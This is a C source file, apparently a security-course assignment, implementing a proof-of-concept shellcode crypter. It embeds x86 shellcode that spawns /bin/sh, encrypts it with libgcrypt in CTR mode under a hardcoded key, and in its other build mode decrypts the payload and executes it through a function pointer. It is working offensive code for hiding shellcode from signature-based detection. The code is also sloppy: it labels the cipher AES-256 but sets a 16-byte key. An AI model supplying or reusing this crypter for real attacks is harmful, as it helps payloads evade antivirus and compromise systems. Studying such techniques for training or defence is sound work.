//Description:	Assignment #7 (PoC of Crypter using AES-256)
//Author: 		Paolo Stivanin <https://github.com/polslinux>
//SLAE ID:		526

#include <stdio.h>
#include <string.h>
#include <gcrypt.h>
#include <stdint.h>

#define ENC 1

static void crypt(int, size_t, uint8_t *);

uint8_t origShell[] = "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";
#if !ENC
uint8_t encShell[] = "";
#endif
uint8_t iv[] = {0x01,0x02,0x03,0x01,0x02,0x03,0x01,0x02,0x03,0x01,0x02,0x03,0x01,0x02,0x03,0x04};
uint8_t ctr[] = {0x02,0x04,0x01,0x01,0x02,0x09,0xf1,0xc2,0x03,0x01,0x02,0xdd,0xec,0x02,0x03,0x04};
const char *key = "securitytubeSLAE";

int main(void){
	int i, ag = gcry_cipher_map_name("aes256");
	size_t ln = strlen(origShell);
	uint8_t *buf = malloc(ln);
	
	crypt(ag, ln, buf);
	#if ENC
	for(i=0; i<ln; i++){
		printf("\\x%02x", buf[i]);
	}
	printf("\n");
	#else
	int (*ret)() = (int(*)())buf;
	ret();
	#endif
	
	free(buf);
		
	return 0;
}

static void crypt(int algo, size_t len, uint8_t *buf){
	gcry_cipher_hd_t hd;
	gcry_cipher_open(&hd, algo, GCRY_CIPHER_MODE_CTR, 0);
	gcry_cipher_setkey(hd, key, 16);
	gcry_cipher_setiv(hd, iv, 16);
	gcry_cipher_setctr(hd, ctr, 16);
	#if ENC
	gcry_cipher_encrypt(hd, buf, len, origShell, len);
	#else
	gcry_cipher_decrypt(hd, buf, len, encShell, len);
	#endif
	gcry_cipher_close(hd);
}
